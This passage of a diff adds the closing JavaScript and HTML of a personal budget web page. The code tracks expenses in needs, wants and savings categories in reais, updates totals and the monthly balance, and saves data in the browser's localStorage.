+        totals.expenses += amount;
+        document.getElementById(`${category}-total`).textContent = totals[category].toFixed(2);
+
+        updateRemaining(category);
+        updateTotalExpenses();
+        updateMonthlyBalance();
+
+        nameInput.value = '';
+        amountInput.value = '';
+
+        saveData();
+    }
+
+    function updateRemaining(category) {
+        const remaining = allocations[category] - totals[category];
+        document.getElementById(`${category}-remaining`).textContent = remaining.toFixed(2);
+    }
+
+    function updateTotalExpenses() {
+        document.getElementById('total-expenses').textContent = totals.expenses.toFixed(2);
+    }
+
+    function updateMonthlyBalance() {
+        const income = parseFloat(document.getElementById('income').value) || 0;
+        const balance = income - totals.expenses;
+        document.getElementById('monthly-balance').textContent = balance.toFixed(2);
+        document.getElementById('savings-accumulated').textContent = totals.savings.toFixed(2);
+    }
+
+    function saveData() {
+        const data = {
+            income: document.getElementById('income').value,
+            expenses: {
+                needs: getExpenses('needs'),
+                wants: getExpenses('wants'),
+                savings: getExpenses('savings')
+            },
+            totals: totals
+        };
+        localStorage.setItem('financeData', JSON.stringify(data));
+    }
+
+    function loadData() {
+        const data = JSON.parse(localStorage.getItem('financeData'));
+        if (data) {
+            document.getElementById('income').value = data.income;
+            totals = data.totals;
+            calculateAllocations();
+            loadExpenses('needs', data.expenses.needs);
+            loadExpenses('wants', data.expenses.wants);
+            loadExpenses('savings', data.expenses.savings);
+        }
+    }
+
+    function getExpenses(category) {
+        const expenseList = document.getElementById(`${category}-expenses`);
+        const expenses = [];
+        expenseList.querySelectorAll('li').forEach(item => {
+            const text = item.querySelector('span').textContent;
+            const name = text.split(': R$ ')[0];
+            const amount = parseFloat(text.split(': R$ ')[1]);
+            expenses.push({name, amount});
+        });
+        return expenses;
+    }
+
+    function loadExpenses(category, expenses) {
+        const expenseList = document.getElementById(`${category}-expenses`);
+        expenseList.innerHTML = '';
+        expenses.forEach(expense => {
+            const expenseItem = document.createElement('li');
+            expenseItem.classList.add('list-group-item');
+
+            const expenseContent = document.createElement('span');
+            expenseContent.textContent = `${expense.name}: R$ ${expense.amount.toFixed(2)}`;
+            expenseItem.appendChild(expenseContent);
+
+            const deleteBtn = document.createElement('button');
+            deleteBtn.classList.add('btn', 'btn-danger', 'btn-sm', 'ms-2');
+            deleteBtn.innerHTML = '<i class="bi bi-trash"></i> Excluir';
+            deleteBtn.onclick = function () {
+                expenseList.removeChild(expenseItem);
+                totals[category] -= expense.amount;
+                totals.expenses -= expense.amount;
+                document.getElementById(`${category}-total`).textContent = totals[category].toFixed(2);
+                updateRemaining(category);
+                updateTotalExpenses();
+                updateMonthlyBalance();
+                saveData();
+            };
+            expenseItem.appendChild(deleteBtn);
+
+            expenseList.appendChild(expenseItem);
+        });
+        document.getElementById(`${category}-total`).textContent = totals[category].toFixed(2);
+        updateRemaining(category);
+        updateTotalExpenses();
+        updateMonthlyBalance();
+    }
+</script>
+
+</body>
+</html>
